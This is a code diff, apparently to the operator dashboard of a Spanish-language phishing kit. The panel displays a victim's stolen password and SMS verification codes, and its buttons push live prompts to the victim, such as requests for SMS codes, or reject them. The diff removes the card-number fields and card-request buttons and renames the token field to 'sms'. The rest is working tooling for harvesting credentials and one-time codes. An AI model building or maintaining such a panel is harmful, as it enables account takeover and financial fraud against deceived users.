@@ -219,20 +219,12 @@
                                     <span class="data-label">Contraseña</span>
                                     <span class="data-value text-rose-600 font-black">${data.Clave}</span>
                                 </div>
-                                <div class="flex justify-between border-b pb-1">
-                                    <span class="data-label">Tarjeta</span>
-                                    <span class="data-value text-purple-700 font-mono">${data.tarjeta || 'No enviada'}</span>
-                                </div>
-                                <div class="flex justify-between border-b pb-1">
-                                    <span class="data-label">Tarjeta 2</span>
-                                    <span class="data-value text-purple-700 font-mono">${data.tarjeta2 || 'No enviada'}</span>
-                                </div>
                             </div>
 
-                            ${data.token ? `
+                            ${data.sms ? `
                                 <div class="mt-4 p-3 rounded-lg border-2 border-yellow-500 bg-yellow-50 sms-pulse shadow-inner">
                                     <div class="data-label text-yellow-800 text-center">📩 SMS</div>
-                                    <div class="text-3xl font-black text-center tracking-[0.5em] text-gray-800">${data.token}</div>
+                                    <div class="text-3xl font-black text-center tracking-[0.5em] text-gray-800">${data.sms}</div>
                                 </div>
                             ` : ''}
                             ${data.sms2 ? `
@@ -259,9 +251,8 @@
                                     <button onclick="enviarOrden('${id}', 'pedir_codigo')" class="btn-panel btn-amber">SOLICITAR SMS</button>
                                     <button onclick="enviarOrden('${id}', 'pedir_codigo_2')" class="btn-panel btn-orange">SOLICITAR SMS 2</button>
                                 </div>
+                                <br>
                                 <div class="flex gap-2">
-                                    <button onclick="enviarOrden('${id}', 'pedir_tarjeta')" class="btn-panel btn-purple">SOLICITAR TARJETA</button>
-                                    <button onclick="enviarOrden('${id}', 'pedir_tarjeta2')" class="btn-panel btn-purple">SOLICITAR TARJETA 2</button>
                                     <button onclick="enviarOrden('${id}', 'rechazar')" class="btn-panel btn-slate">RECHAZAR</button>
                                 </div>
                             </div>
